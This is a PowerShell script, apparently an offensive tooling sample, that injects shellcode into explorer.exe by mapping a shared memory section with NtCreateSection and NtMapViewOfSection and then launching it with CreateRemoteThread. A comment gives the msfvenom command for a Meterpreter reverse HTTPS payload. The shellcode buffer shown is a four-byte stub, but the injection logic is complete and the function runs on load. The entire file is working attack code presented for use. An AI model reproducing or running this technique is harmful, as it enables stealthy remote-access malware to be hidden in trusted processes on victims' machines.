function Standard_Process_Injection_Alternative {

    $Kernel32 = @'
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;

    public class Kernel32
    {
        // OpenProcess - kernel32.dll
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        // CreateRemoteThread - kernel32.dll
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        // GetCurrentProcess - kernel32.dll
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();
    }

    public class Ntdll
    {
        // NtCreateSection - ntdll.dll
        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        public static extern UInt32 NtCreateSection(
            ref IntPtr section,
            UInt32 desiredAccess,
            IntPtr pAttrs,
            ref long MaxSize,
            uint pageProt,
            uint allocationAttribs,
            IntPtr hFile);

        // NtMapViewOfSection - ntdll.dll
        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        public static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        // NtUnmapViewOfSection - ntdll.dll
        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        public static extern uint NtUnmapViewOfSection(
            IntPtr hProc,
            IntPtr baseAddr);

        // NtClose - ntdll.dll
        [DllImport("ntdll.dll", SetLastError = false, ExactSpelling = true)]
        public static extern int NtClose(IntPtr hObject);
    }
'@

    Add-Type $Kernel32

    # msfvenom.bat -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=7710 -f powershell
    [Byte[]] $buf = 0xfc,0x48,0x83,0xe4
    $size = $buf.Length
    $buffer_size = [long]$size

    # Create the section handle
    [IntPtr] $ptr_section_handle = [IntPtr]::Zero
    $create_section_status = [Ntdll]::NtCreateSection([ref] $ptr_section_handle, 0xe, [IntPtr]::Zero, [ref] $buffer_size, 0x40, 0x08000000, [IntPtr]::Zero)

    # Map a view of a section into the virtual address space of the current process
    [IntPtr] $ptr_local_section_addr = [IntPtr]::Zero
    $local_section_offset = 0
    $local_map_view_status = [Ntdll]::NtMapViewOfSection($ptr_section_handle, [Kernel32]::GetCurrentProcess(), [ref] $ptr_local_section_addr, [IntPtr]::Zero, [IntPtr]::Zero, [ref] $local_section_offset, [ref] $buffer_size, 0x2, 0, 0x04)

    # Copy the shellcode into the mapped section
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr_local_section_addr, $size)

    # Get the process ID of explorer
    $Process = (Get-Process -Name "explorer")[0]
    $hProcess = [Kernel32]::OpenProcess(0x001F0FFF, $false, $Process.Id)

    # Map a view of the section in the virtual address space of the targeted process
    [IntPtr] $ptr_remote_section_addr = [IntPtr]::Zero
    $remote_map_view_status = [Ntdll]::NtMapViewOfSection($ptr_section_handle, $hProcess, [ref] $ptr_remote_section_addr, [IntPtr]::Zero, [IntPtr]::Zero, [ref] $local_section_offset, [ref] $buffer_size, 0x2, 0, 0x20)

    # Unmap the view of the section from the current process & close the handle
    [Ntdll]::NtUnmapViewOfSection([Kernel32]::GetCurrentProcess(), $ptr_local_section_addr) > $null
    [Ntdll]::NtClose($ptr_section_handle) > $null

    # Create a remote thread in the target process to execute the shellcode
    [Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $ptr_remote_section_addr, [IntPtr]::Zero, 0, [IntPtr]::Zero) > $null
}

Standard_Process_Injection_Alternative
